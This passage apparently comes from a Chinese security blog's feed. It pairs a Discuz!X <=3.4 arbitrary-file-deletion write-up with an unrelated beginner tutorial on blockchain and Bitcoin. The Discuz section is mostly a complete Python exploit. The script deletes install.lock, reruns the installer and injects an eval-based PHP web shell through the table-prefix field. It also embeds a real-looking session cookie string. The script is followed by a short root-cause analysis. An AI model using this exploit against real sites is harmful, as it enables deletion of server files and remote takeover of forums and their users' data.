function_ invoke__">strlen</span>(<span class="variable">$val</span>) &gt; <span class="number">12</span>) ? <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="title function_ invoke__">addcslashes</span>(<span class="variable">$val</span>, <span class="string">&#x27;\&#x27;\\&#x27;</span>).<span class="string">&#x27;\&#x27;&#x27;</span> : <span class="variable">$val</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="variable">$pre</span>.<span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>.<span class="string">&quot; = <span class="subst">$val</span>;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考链接">参考链接</h4><p><a href="http://www.cnblogs.com/LittleHann/p/4317665.html" title="http://www.cnblogs.com/LittleHann/p/4317665.html">http://www.cnblogs.com/LittleHann/p/4317665.html</a></p><h3 id="任意文件删除及其衍生getshell">任意文件删除及其衍生getshell</h3><p>Discuz!X&lt;=3.4可用 提供可复现版本的dz:<a href="/images/2018/07/DiscuzX.zip">下载DiscuzX</a> 漏洞本来是14年6月被交到wooyun的洞,原来的利用已经修复,添加了对属性的formtype判断,但是修复不完全导致可以绕过.</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">randstr = <span class="keyword">lambda</span> <span class="built_in">len</span>=<span class="number">5</span>: <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################</span></span><br><span class="line"><span class="comment">########## Customize these parameters ############</span></span><br><span class="line">target = <span class="string">&#x27;http://localhost/discuzx&#x27;</span></span><br><span class="line"><span class="comment"># login target site first, and copy the cookie here</span></span><br><span class="line">cookie = <span class="string">&quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;</span></span><br><span class="line">shell_password = randstr()</span><br><span class="line">db_host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_user = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_pw = <span class="string">&#x27;&#x27;</span></span><br><span class="line">db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#x27;</span></span><br><span class="line">url = target + path</span><br><span class="line"></span><br><span class="line">sess.headers.update(&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: url&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sess.proxies.update(&#123;&#x27;http&#x27;: &#x27;socks5://localhost:1080&#x27;&#125;)</span></span><br><span class="line"><span class="comment"># sess.proxies.update(&#123;&#x27;http&#x27;: &#x27;http://localhost:8080&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username=<span class="literal">None</span>, password=<span class="literal">None</span></span>):</span><br><span class="line">    sess.headers.update(&#123;<span class="string">&#x27;Cookie&#x27;</span>: cookie&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_form_hash</span>():</span><br><span class="line">    r = sess.get(url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&quot;member.php\?mod=logging&amp;action=logout&amp;formhash=(.*?)&quot;&#x27;</span>, r.text, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">formhash, file_to_delete</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;formhash&#x27;</span>: (<span class="literal">None</span>, formhash),</span><br><span class="line">        <span class="string">&#x27;profilesubmit&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;true&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;birthprovince&#x27;</span>: (<span class="literal">None</span>, file_to_delete)</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(url, files=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;parent.show_success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;tamperred successfully&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">formhash, file</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tamper(formhash, file):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    image = <span class="string">b&#x27;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;formhash&#x27;</span>: formhash,</span><br><span class="line">        <span class="string">&#x27;profilesubmit&#x27;</span>: <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;birthprovince&#x27;</span>: (<span class="string">&#x27;image.png&#x27;</span>, base64.b64decode(image), <span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(url, data=data, files=files)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;parent.show_success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;delete &#123;&#125; successfully&#x27;</span>.<span class="built_in">format</span>(file))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>():</span><br><span class="line">    install_url = target + <span class="string">&#x27;/install/index.php&#x27;</span></span><br><span class="line">    r = sess.get(install_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;安装向导&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;install directory not exists&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    table_prefix = <span class="string">&quot;x&#x27;);@eval($_POST[&#123;&#125;]);(&#x27;&quot;</span>.<span class="built_in">format</span>(shell_password)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;step&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">&#x27;install_ucenter&#x27;</span>: <span class="string">&#x27;yes&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbhost]&#x27;</span>: db_host,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbname]&#x27;</span>: db_name,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbuser]&#x27;</span>: db_user,</span><br><span class="line">        <span class="string">&#x27;dbinfo[dbpw]&#x27;</span>: db_pw,</span><br><span class="line">        <span class="string">&#x27;dbinfo[tablepre]&#x27;</span>: table_prefix,</span><br><span class="line">        <span class="string">&#x27;dbinfo[adminemail]&#x27;</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[username]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[password]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[password2]&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admininfo[email]&#x27;</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = sess.post(install_url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;建立数据表 CREATE TABLE&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;write shell failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;shell: &#123;&#125;/config/config_ucenter.php&#x27;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(shell_password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    login()</span><br><span class="line">    form_hash = get_form_hash()</span><br><span class="line">    <span class="keyword">if</span> form_hash:</span><br><span class="line">        delete(form_hash, <span class="string">&#x27;../../../data/install.lock&#x27;</span>)</span><br><span class="line">        getshell()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="代码逻辑">代码逻辑</h4><p>核心问题在<code>upload/source/include/spacecp/spacecp_profile.php</code> 首先看到第70行 <img src="/images/2018/07/dz-5.jpg" alt="blacsheep" /> 当profile提交的时候执行下面的代码 然后继续往下看 <img src="/images/2018/07/dz-6.jpg" alt="blacsheep" /> 这里本来没有判断,那么我们传入deletefile,然后遍历的时候把<code>$space[$key]</code>拼接到路径然后unlink删掉了,其中<code>$space[$key]</code>是可控的 加了判断之后不行了,因为用户信息字段都是非file类型,没办法 然而后面还是有漏洞,从第187行开始</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>) &#123;</span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">discuz_upload</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_G</span>[<span class="string">&#x27;cache&#x27;</span>][<span class="string">&#x27;profilesetting&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$setarr</span>[<span class="variable">$key</span>]) &amp;&amp; <span class="variable">$_G</span>[<span class="string">&#x27;cache&#x27;</span>][<span class="string">&#x27;profilesetting&#x27;</span>][<span class="variable">$key</span>][<span class="string">&#x27;needverify&#x27;</span>]) &#123;</span><br><span class="line">                    @<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">getglobal</span>(<span class="string">&#x27;setting/attachdir&#x27;</span>).<span class="string">&#x27;./profile/&#x27;</span>.<span class="variable">$verifyinfo</span>[<span class="string">&#x27;field&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$verifyarr</span>[<span class="variable">$key</span>] = <span class="variable">$attach</span>[<span class="string">&#x27;attachment&#x27;</span>];</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">getglobal</span>(<span class="string">&#x27;setting/attachdir&#x27;</span>).<span class="string">&#x27;./profile/&#x27;</span>.<span class="variable">$space</span>[<span class="variable">$key</span>]);</span><br><span class="line">                <span class="variable">$setarr</span>[<span class="variable">$key</span>] = <span class="variable">$attach</span>[<span class="string">&#x27;attachment&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里只要传一张图片就可以绕过,然后unlink掉删除的文件 官方的修复是删掉了5个unlink...简单粗暴,但是确实有效... 重装的过程就不分析了,简而言之就是安装的时候tablepre的值可以插入到config.inc.php文件中,从而getshell</p><h4 id="参考链接-1">参考链接</h4><p><a href="http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/" title="http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/">http://blog.nsfocus.net/discuz-arbitrary-file-remove-vulnerability/</a> <a href="https://fafe.me/2017/10/02/discuz-getshell/" title="https://fafe.me/2017/10/02/discuz-getshell/">https://fafe.me/2017/10/02/discuz-getshell/</a> <a href="https://paper.seebug.org/411/" title="https://paper.seebug.org/411/">https://paper.seebug.org/411/</a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BlockChain&amp;Bitcoin学习</title>
      <link href="/2018/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>近期也没啥事情,准备复现一下之前的题目,发现有两道区块链的题,这里先学习一下区块链,之后再写题目的解答</p><h2 id="区块链">区块链</h2><h3 id="区块链的本质">1.区块链的本质</h3><p>首先看来,区块链是什么? <strong>区块链是一种特殊的分布式数据库</strong> 区块链的作用是存储信息,任何需要保存的信息都可以写入,也可以从中读取,所以说是数据库 任何人都可以架设服务器加入区块链网络,成为一个节点。 区块链的一个很大的特点:<strong>没有中心</strong> 每一个节点都是平等的,都保存着整个数据库,你可以向任意一个节点写入或读取数据,所有节点最后都会同步,保证区块链一致。</p><h3 id="区块">2.区块</h3><p>区块链由一个个区块组成,区块就很想数据库的记录,每次写入数据就是创建一个区块。 每个区块包含两个部分</p><blockquote><p>1.区块头(Head):记录当前区块的特征值 2.区块体(Body):实际数据</p></blockquote><p>区块头包含很多当前区块的特征值</p><blockquote><p>1.生成时间 2.实际数据的hash 3.上一个区块的hash ...</p></blockquote><p>因此,有两个推论:</p><blockquote><p>1.每个区块链的hash都不一样,可以通过hash标识区块 2.如果区块的内容变了,它的hash一定会变</p></blockquote><h3 id="hash的不可修改">3.hash的不可修改</h3><p>区块和hash一一对应,每个区块的hash都是针对区块头计算的,也就是把区块头的各项值按顺序连接组成一个很长的字符串,然后对这个字符串计算hash</p><blockquote><p>Hash=SHA256(区块头)</p></blockquote><p>公式注意进行sha256运算的只是头部,并不包括内容,也就是hash由区块头唯一确定 前面说过,区块头包含很多东西,其中有当前区块体的hash,也有上一区块的区块的hash,那么就是说,如果当前区块体的内容变了,或者上一区块的hash变了,那么就会导致当前区块的hash改变 这一点对区块链有重大意义。如果有人修改了一个区块,该区块的hash就变了,为了让后面的区块能找到它,那么这个人还必须修改后面的所有区块,否则被改掉的区块就脱离区块链了。 而这就是后面要讨论的,因为hash的计算很耗时,短时间修改多个区块几乎不可能发生,除非有人<strong>掌握了全网51%以上的计算能力</strong> 这是这种机制,区块链保证了自身的可靠性,数据一旦写入就无法被篡改,就像历史一样,无法再进行改变,每个区块连接一个区块,也就是区块链的名字的由来。</p><h3 id="采矿">4.采矿</h3><p>由于要保证节点之间的同步,所以新的区块的添加速度不能太快。试想一下,你刚刚同步了一个区块,准备基于它生成下一个区块,但这时别的节点又有新区块生成,你不得不放弃做了一半的计算,再去同步,因为每个区块的后面只能跟着一个区块,你永远只能在最新的区块后面,生成下一个区块。所以,你别无选择,一听到信号,就必须立刻同步。 为了尽力避免这种情况,区块链的发明者中本聪(假名)故意让添加新区块变得困难。他的设计是平均每10分钟,全网才能生成一个新区块,一个小时就6个 而这个速度并不是通过命令实现的,而是故意设了海量的计算。也就是说,只有通过极其大量的计算,才能得到当前区块的有效hash,从而把新区快添加到区块链,计算量太大,所以快不起来 而这个计算有效hash的过程就叫采矿,操纵矿机的人就叫矿工</p><h3 id="难度系数">5.难度系数</h3><p>难度系数决定了你算出来的hash是否是有效hash,也就是这个导致了平均每10分钟全网只能产生一个区块. 区块头包含一个难度系数,这个值决定了hash计算的难度,举例来说,第100000个区块的难度系数是14484.16236122 <img src="/images/2018/07/blockchain-1.png" alt="blacsheep" /> 区块链协议规定,使用一个常量除以难度系数,可以得到目标值。显然难度系数越大,目标值就越小 <img src="/images/2018/07/blockchain-2.png" alt="blacsheep" /> hash的有效性和目标值相关,只有小于目标的hash才是有效的,否则hash无效,必须重算。由于目标值很小,hash小于该值的机会很小,可能计算10亿次才算中一次所以采矿慢 前面说过当前区块的hash由区块头唯一决定,如果对同意区块反复计算hash就意味着区块头必须不停变化,否则不可能计算出不一样的hash 区块头里面所有的特征值都是固定的,为了让区块头发生变化,中本聪故意加了一个随机项叫做Nonce Nonce是一个随机值,矿工的作用就是猜出Nonce,使得目标hash可以小于目标值,从而能够写入区块链。 Nonce非常难猜,目前只能通过穷举法来获取,根据协议,Nonce是一个32位的二进制数值,最大可到21.47亿,第100000个区块的Nonce值为274148111,可以理解成矿工从0开始计算了2.74亿次才得到了一个有效Nonce,使得hash能够满足条件 运气好的话,也许一会就能找到Nonce,运气不好的话,可能算完了21.47亿次都没有发现Nonce,即当前区块体不可能算出满足条件的hash,这时协议<strong>允许矿工改变区块体</strong>,开始新的计算</p><h3 id="难度系数的动态调节">6.难度系数的动态调节</h3><p>如上面所说,采矿有随机性,没法保证正好10分钟产出一个区块,有时候一分钟就算出来,有时候几个小时也算不出来,不过总体来看,随着设备的提升以及矿机的增加,计算速度一定越来越快 为了将产出速度恒定,中本聪设计了难度系数的调节机制,规定每两周调节一次难度系数,如果两周里面区块的生成平均速度是9分钟,意味着比法定的快了10%,那么后面的难度系数就会调高10%,如果是11分钟就会降低 难度系数越高,采矿越难</p><h3 id="区块链分叉">7.区块链分叉</h3><p>这个问题发生在两个人同时向区块链写数据,也就是说有两个区块的加入,因为它们前面都连接着前一个区块,也就形成了分叉,这时候应该采用哪个呢? <img src="/images/2018/07/blockchain-3.png" alt="blacsheep" /> 目前的规则是新节点总采用最长的那条区块链,如果区块链有分叉,将看哪个分支在分叉点后面先达到6个新区块(称为"六次确认")。按照10分钟一个区块计算,一个小时就可以确认 <img src="/images/2018/07/blockchain4.png" alt="blacsheep" /> 新区快的生成速度决定计算能力,这个规则就是说,拥有大多数计算能力的那个分支就是正宗的区块链.</p><h3 id="总结">8.总结</h3><p>区块链作为无人管理的分布式数据库,从2009年到现在还正常运行说明可行,不过为了保证数据的可靠,区块链也付出了代价。一是效率,数据写入区块链最少需要10分钟,所有节点都需要同步,则需要更久,二是能源,区块的生成需要矿工进行大量无意义计算,这是非常耗费能源的 总结来看,区块链的适用场景其实非常有限</p><blockquote><p>1.不存在所有成员都相信的管理当局 2.写入数据不要求实时使用 3.挖矿的收益能够弥补自身成本</p></blockquote><p>如果不行的话,传统的数据库则是更好的选择.</p><h2 id="bitcoin">bitcoin</h2><p>大概了解了一下区块链相关的知识,下面我们来看一下bitcoin</p><h3 id="非对称加密">1.非对称加密</h3><p>首先要知道,bitcoin是基于非对称加密的,平时我们加密的明文是信息,那么如果这个信息是一笔钱呢? 支付方用你的公钥加密一笔钱,你手上有私钥,那么你就可以解开加密包,别人偷不走钱,因为他们没有你的私钥,这就是bitcoin的最基本的原理,由于支付的钱必须由私钥取出,所以不管你是谁,重要的是谁有私钥,只要拥有私钥就能取出钱(实际上真实流程是私钥保证你能把这些钱支付出去)</p><h3 id="bitcoin钱包">2.bitcoin钱包</h3><p>对于比特币来说,钱不是支付给个人的,而是支付给某个私钥的,这就是交易匿名性的根本原因,因为没有人知道,那些私钥背后的主人是谁 那么比特币交易的第一件事就是你必须有自己的公钥和私钥。 从协议来看,公钥的长度是512位,这个长度不太方便传播,所以协议又为公钥生成了一个160位的指纹。就是比较短的易于传播的hash,160bit是二进制,写成16进制的话就26-35个字符,比如1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2。这个就叫做钱包的地址,它是唯一的,每个钱包的地址肯定是不一样的。 交易的时候,你只要给别人你的钱包地址即可,对方向这个地址付款,由于你是这个地址的拥有者,所以你会收到这笔钱,那么如何证明你是这个地址的拥有者呢?这个是由私钥证明的(后面介绍),所以一定要保护好私钥,否则别人就可以用你的身份把钱包里的钱都转走了</p><h3 id="交易过程">3.交易过程</h3><p>具体来看就是<strong>把一个地址的bitcoin转到另外一个地址。</strong>由于比特币的交易全部都是公开的,哪个地址拥有多少比特币都是可以查得到的。因此,支付方是否有足够的比特币来进行支付也是可以验证的 问题在于如何去防止其他人冒用你的名义去申报交易,也就是说,地址A向B支付10个比特币,我怎么知道这个申报是真的,申报人就是A 比特币协议规定,申报交易的时候除了交易金额以外,转出一方还要提供以下数据</p><blockquote><p>1.上一笔交易的hash 2.本次交易双方的地址 3.支付方的公钥 4.支付方私钥生成的数字签名</p></blockquote><p>验证的时候</p><blockquote><p>1.找到上一笔交易,确认支付方的比特币来源 2.算出支付方公钥的指纹,确认和支付方一致,从而保证公钥属实 3.用公钥去解开数字签名,保证私钥属实</p></blockquote><h3 id="交易确认和区块链">4.交易确认和区块链</h3><p>确认交易的真实性之后,交易还不算结束。交易的数据必须写入数据库才算成立,对方才能真正的收到钱。 首先所有的交易都会传送到矿工那里,矿工负责把这些交易写入区块链。 根据比特币协议,一个区块的大小最大是1MB,而一笔交易大概是500字节左右,因此一个区块最多可以包含2000多笔交易。矿工负责把2000多笔交易打包,组成一个区块然后计算区块的hash(采矿),这个过程是矿工之间的竞争,谁先算出hash就可以写入数据,从而享受这个区块的所有利益,其他矿工就将一无所获. 这里注意我们前面说到的,一笔交易一旦写入了区块链就无法反悔了,比特币不存放在钱包或者其他别的地方,而是只存在区块链上,由区块链记录你每一笔交易,你得到过多少,支出过多少,最终算出你拥有多少资金</p><h3 id="矿工收益">5.矿工收益</h3><p>交易离不开矿工,那么谁愿意做矿工呢? 比特币协议规定,挖到新的区块的矿工将获得奖励,一开始是50个比特币,然后每4年减半,目前是12.5个比特币,这也是比特币的供给增加机制,流通中的比特币都是这么产生的 虽然按这种计算,2140年就不会再产生比特币了,矿工就将无法获得奖励了,那么比特币的数量也就停止增加了,矿工也只能从手续费中获得比特币了 交易的时候矿工可以从每笔交易抽成,具体金额由支付方自愿决定,你可以选择支付高额,那么会被优先处理,也可以不给任何金额,那么你的交易也不会被矿工所处理.</p><h3 id="区块扩容">区块扩容</h3><p>比特币协议规定,每10分钟产生一个区块,区块的大小只有1MB,最多只能包含2000多笔交易,也就是说,比特币网络每10分钟,最多只能处理2000多笔交易,换算一下,就是处理速度是3~5笔/秒 全世界的交易那么多,处理的速度又这么慢,这已经成为了制约比特币发展的瓶颈了 后来有人呼吁说改革比特币协议,增加处理速度,在2017年8月时,区块链发生了一次分叉,诞生了一个新的协议,成为Bitcoin Cash,这个货币其他方面和比特币一致,但是就是区块的大小从1MB变成了8MB,处理速度变成了原来的8倍,手续费也低了很多,这个协议是对原有区块链的分叉,所以当时持有比特币的人等于一人获赠一份同样数量的BCH</p><h3 id="最后">最后</h3><p>那么到这里比特币到底是什么呢?它其实就是一个记录,凭空产生的记录,举个例子,矿工获得12.5个比特币的奖励,那么区块链就会有一个记录:"xxx地址获得12.5个比特币"。正是这些记录导致矿工获得了大笔金钱,如果区块链突然增加了一条记录,记载你获得了1000比特币,那么你就真的有1000比特币(虽然并不会,这只是举个例子) 参考链接: <a href="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" title="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html</a> <a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html" 